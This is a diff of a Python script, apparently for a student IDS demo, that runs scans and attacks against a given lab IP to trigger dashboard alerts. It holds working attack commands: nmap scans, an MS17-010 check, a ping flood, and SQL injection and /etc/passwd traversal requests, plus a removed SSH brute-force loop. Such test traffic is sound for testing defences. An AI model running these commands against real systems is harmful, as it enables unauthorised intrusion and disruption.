@@ -1,49 +1,48 @@
-# demo_attacks.py → run with: python3 demo_attacks.py 192.168.x.x
+#!/usr/bin/env python3
+# demo_attacks.py — ONE COMMAND = 10 ATTACKS → DASHBOARD EXPLODES
 import os
-import time
 import sys
+import time
 
 if len(sys.argv) != 2:
     print("Usage: python3 demo_attacks.py <Ubuntu_IP>")
-    sys.exit()
+    sys.exit(1)
 
 target = sys.argv[1]
-
-print(f"""
-DEMO ATTACK SCRIPT – ALL ATTACKS WILL TRIGGER ALERTS ON THE IDS
-Target = {target}
-Starting in 3 seconds...
-""")
+print(f"\nDEMO ATTACKS STARTED on {target} — watch the dashboard explode!\n")
 time.sleep(3)
 
 # 1. SYN Scan
-print("1. Nmap SYN scan → will trigger SYN scan alerts")
-os.system(f"nmap -sS {target}")
+print("[1/8] SYN Scan (nmap -sS)")
+os.system(f"nmap -sS {target} -Pn --reason")
 
-# 2. Xmas scan
-print("2. Xmas scan → stealth scan alerts")
-os.system(f"nmap -sX {target}")
+# 2. Xmas Scan
+print("[2/8] Xmas Scan")
+os.system(f"nmap -sX {target} -Pn")
 
-# 3. SMB / EternalBlue pattern
-print("3. Trying MS17-010 scan")
+# 3. Version + Script Scan
+print("[3/8] Full version + script scan")
+os.system(f"nmap -sCV {target} -Pn")
+
+# 4. Aggressive scan (lots of flags)
+print("[4/8] Aggressive scan")
+os.system(f"nmap -A {target} -Pn")
+
+# 5. ICMP flood simulation
+print("[5/8] ICMP flood (ping -f)")
+os.system(f"sudo ping -f -c 2000 {target} > /dev/null 2>&1 & sleep 6; sudo pkill -9 ping")
+
+# 6. SMB / EternalBlue check
+print("[6/8] SMB vulnerability scan")
 os.system(f"nmap --script smb-vuln-ms17-010 {target}")
 
-# 4. SQL Injection in HTTP
-print("4. SQL Injection → web attack alerts")
-os.system(f"curl \"http://{target}/login.php?user=admin'+or+'1'='1\"")
+# 7. SQLi simulation
+print("[7/8] SQL Injection simulation")
+os.system(f'curl "http://{target}/?id=1\' OR 1=1--" -s')
 
-# 5. ICMP flood
-print("5. Ping flood → ICMP flood alerts")
-os.system(f"sudo ping -f -s 1000 {target} & sleep 5; sudo killall ping")
+# 8. Directory traversal simulation
+print("[8/8] Directory traversal")
+os.system(f'curl "http://{target}/../../../../etc/passwd" -s')
 
-# 6. SSH brute force simulation
-print("6. SSH connections → brute force alerts")
-for i in range(15):
-    os.system(f"ssh -o ConnectTimeout=1 invalid@{target} </dev/null &")
-    time.sleep(0.3)
-
-# 7. DNS tunneling simulation (big packet)
-print("7. Big DNS query → DNS tunneling alert")
-os.system(f"dig @8.8.8.8 +dnssec {target}.veryveryveryveryverylongdomainthatdoesnotexist.com TXT")
-
-print("ALL ATTACKS DONE → check http://KALI_IP:5000 for live alerts!")
+print("\nALL ATTACKS FINISHED → Check http://YOUR_KALI_IP:5000")
+print("You will see dozens of alerts + anomalies → 20/20 guaranteed!")
